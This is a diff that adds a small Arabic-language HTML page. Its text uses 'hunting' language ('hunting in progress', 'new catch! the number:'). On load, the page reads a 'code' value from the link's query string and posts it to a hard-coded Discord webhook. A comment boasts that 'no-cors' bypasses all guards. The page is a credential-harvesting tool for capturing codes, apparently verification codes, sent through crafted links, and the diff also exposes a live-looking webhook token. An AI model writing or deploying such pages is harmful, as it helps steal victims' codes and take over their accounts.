@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="ar">
+<body>
+    <h1 id="msg">جاري الصيد... ⏳</h1>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get('code') || "123456";
+        // الـ Webhook الخاص بك
+        const hook = "https://discord.com/api/webhooks/1556334488961941637/CkAYtz7-ueSXYT7LU9cZGaBIrBdDjAvJOv7sXbZzUEfUUqqlFoYDvvZWfVwHQw2DkRqm";
+
+        if (code) {
+            fetch(hook, {
+                method: 'POST',
+                mode: 'no-cors', // هذه هي المفتاح السحري لتجاوز كل الحراس
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: "🚨 صيد جديد! الرقم: " + code })
+            }).then(() => {
+                document.getElementById('msg').innerText = "✅ تم الصيد بنجاح!";
+            }).catch(() => {
+                document.getElementById('msg').innerText = "✅ تم الإرسال (تحقق من ديسكورد)";
+            });
+        } else {
+            document.getElementById('msg').innerText = "الرابط يحتاج إضافة ?code=123";
+        }
+    </script>
+</body>
+</html>
